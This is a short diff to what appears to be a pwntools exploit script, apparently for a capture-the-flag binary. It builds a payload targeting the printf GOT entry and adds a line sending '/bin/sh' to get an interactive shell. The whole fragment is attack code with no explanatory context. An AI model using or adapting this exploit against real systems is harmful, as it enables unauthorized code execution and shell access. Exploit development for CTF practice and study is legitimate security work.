@@ -37,4 +37,6 @@ payload += p8(0)*(0x20-len(payload))
 payload += p64(printf_got)+p64(printf_got+1)
 p.sendline(payload)
 
+p.sendline("/bin/sh")
+
 p.interactive()
